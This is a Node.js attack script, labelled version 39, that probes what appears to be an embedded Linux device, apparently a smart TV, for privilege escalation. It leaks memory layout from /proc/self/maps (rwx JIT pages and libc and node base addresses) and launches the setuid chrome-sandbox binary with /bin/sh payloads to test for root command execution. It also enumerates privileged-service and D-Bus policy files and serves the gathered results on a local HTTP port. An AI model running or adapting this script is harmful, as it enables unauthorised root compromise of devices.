// v39 - probe chrome-sandbox, find ps_mknod auth config, read our own maps
// Pull server: 8122
try {
  var cp = require('child_process');
  var http = require('http');
  var fs = require('fs');
  var res = {};
  var total = 0, done_count = 0;

  function finish(key, val) {
    res[key] = String(val).substring(0, 1200);
    done_count++;
    if (done_count >= total) flush();
  }
  function flush() {
    var body = Object.keys(res).map(function(k){ return '[' + k + ']: ' + res[k]; }).join('\n') + '\n=== LIVE ===\n';
    try { fs.writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe39.txt', body); } catch(e) {}
    var srv = http.createServer(function(req, resp) {
      resp.writeHead(200, {'Content-Type': 'text/plain'});
      resp.end(body);
    });
    srv.listen(8122, '127.0.0.1', function(){});
    srv.on('error', function(){});
    setInterval(function(){}, 60000);
  }

  function run(key, cmd) {
    total++;
    cp.exec(cmd + ' 2>&1', {timeout:8000}, function(err,out){
      finish(key, out||String(err));
    });
  }

  // 1. Read OUR process's maps (not a child) - V8 JIT rwx pages
  total++;
  try {
    var myMaps = fs.readFileSync('/proc/self/maps', 'utf8');
    var rwx = myMaps.split('\n').filter(function(l){ return l.indexOf('rwxp') !== -1; });
    var libc = myMaps.split('\n').filter(function(l){ return l.indexOf('libc-2.24') !== -1 && l.indexOf('r-xp') !== -1; });
    var node = myMaps.split('\n').filter(function(l){ return l.indexOf('node') !== -1 && l.indexOf('r-xp') !== -1; });
    var libdl = myMaps.split('\n').filter(function(l){ return l.indexOf('libdl') !== -1 && l.indexOf('r-xp') !== -1; });
    finish('own_maps', 'rwx_pages:' + rwx.join('|') + '\nlibc_rx:' + libc[0] + '\nnode_rx:' + node[0] + '\nlibdl_rx:' + libdl[0]);
  } catch(e) {
    finish('own_maps', String(e.message));
  }

  // 2. Try chrome-sandbox with various args
  var CS = '/usr/lib/chromium-efl/chrome-sandbox';
  run('cs_noargs',   CS);
  run('cs_sh',       CS + ' /bin/sh -c "id>/tmp/r39.txt"');
  run('cs_id',       CS + ' /bin/sh -c id');
  run('cs_wutil',    CS + ' /usr/bin/wasutility');
  run('cs_help',     CS + ' --help');
  run('cs_ver',      CS + ' --version');
  run('cs_check',    CS + ' --no-sandbox /bin/sh -c id');

  // 3. Look for ps_mknod auth config
  run('ps_conf',     'find /etc /usr/apps/privileged-service /usr/share -name "*.conf" -o -name "*.xml" -o -name "*.json" -o -name "*.policy" 2>/dev/null | head -30');
  run('ps_etc',      'ls /etc/privileged-service/ 2>/dev/null; ls /usr/apps/privileged-service/ 2>/dev/null');
  run('ps_conf_rd',  'ls /usr/apps/privileged-service/res/ 2>/dev/null; cat /usr/apps/privileged-service/res/*.conf 2>/dev/null | head -50');

  // 4. After chrome-sandbox runs, check if /tmp/r39.txt was created
  setTimeout(function() {
    run('r39_created', 'ls -la /tmp/r39.txt; cat /tmp/r39.txt 2>/dev/null; echo ---; id');
  }, 10000);

  // 5. Look at other installed privileged services
  run('priv_svcs',   'ls /usr/apps/ 2>/dev/null | grep -i priv; ls /etc/dbus-1/system.d/*.conf 2>/dev/null | head -20');
  run('priv_svc_conf', 'cat /etc/dbus-1/system.d/com.safe.ps_mknod.conf 2>/dev/null; cat /etc/dbus-1/system.d/com.safe*.conf 2>/dev/null');

  // 6. String search on chrome-sandbox for key behavior clues
  run('cs_strings',  'strings ' + CS + ' 2>/dev/null | grep -E "helper|exec|fork|check|path|parent|uid|root|suid|safe" | head -40');

} catch(e) {
  try { require('fs').writeFileSync('/home/owner/share/tmp/sdk_tools/tbprobe39-crash.txt', String(e.stack||e.message).substring(0,500)); } catch(e2){}
}
